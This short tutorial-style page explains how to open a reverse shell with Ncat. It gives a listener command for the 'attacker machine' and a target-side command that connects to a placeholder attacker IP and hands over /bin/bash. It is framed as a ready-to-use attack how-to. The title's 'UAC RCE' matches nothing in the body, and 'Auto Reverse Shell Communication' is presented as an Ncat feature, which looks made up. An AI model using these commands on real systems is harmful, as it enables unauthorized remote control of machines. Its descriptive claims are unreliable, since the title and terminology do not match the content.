# UAC RCE based on Ncat Auto Reverse Shell Communication
Ncat is a command-line tool that provides a lot of features for network communication. One of its features is Auto Reverse Shell Communication, which allows you to create a reverse shell connection from the target machine to the attacker's machine.

Configuration
To configure Auto Reverse Shell Communication using Ncat, follow these steps:

Set up the listener on the attacker machine. This is done using the following command:

## ncat -nvlp <port_number>

Replace <port_number> with the port number you want to use for the connection.

Set up the reverse shell connection from the target machine to the attacker machine. This is done using the following command:

## ncat <attacker_IP_address> <attacker_port_number> -e /bin/bash

Replace <attacker_IP_address> with the IP address of the attacker machine and <attacker_port_number> with the port number you used in step 1.

The -e /bin/bash option specifies that the shell to be spawned on the target machine is the Bash shell.

Once the connection is established, you can interact with the target machine's shell from the attacker machine's shell.

For example, you can run commands on the target machine by typing them into the attacker machine's shell, and the output will be displayed in the attacker machine's shell.

That's it! You have now configured Ncat Auto Reverse Shell Communication.
